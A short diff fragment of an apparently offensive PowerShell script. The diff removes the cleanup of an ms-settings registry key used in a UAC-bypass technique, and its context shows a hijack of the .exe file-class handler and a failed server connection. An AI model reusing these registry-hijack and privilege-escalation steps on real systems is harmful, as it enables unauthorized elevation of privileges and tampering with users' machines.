@@ -92,12 +92,6 @@ New-ItemProperty -Path "HKCU:\Software\Classes\.exe" -Name "" -Value "Applicatio
         {
             Remove-Item -Path $OutPath\$output
             
-        #UAC_CODE_START
-            #Remove registry structure
-            Start-Sleep 3
-            Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
-
-        #UAC_CODE_END
         }
     } else {
         Write-Output "Unable to connect to server"
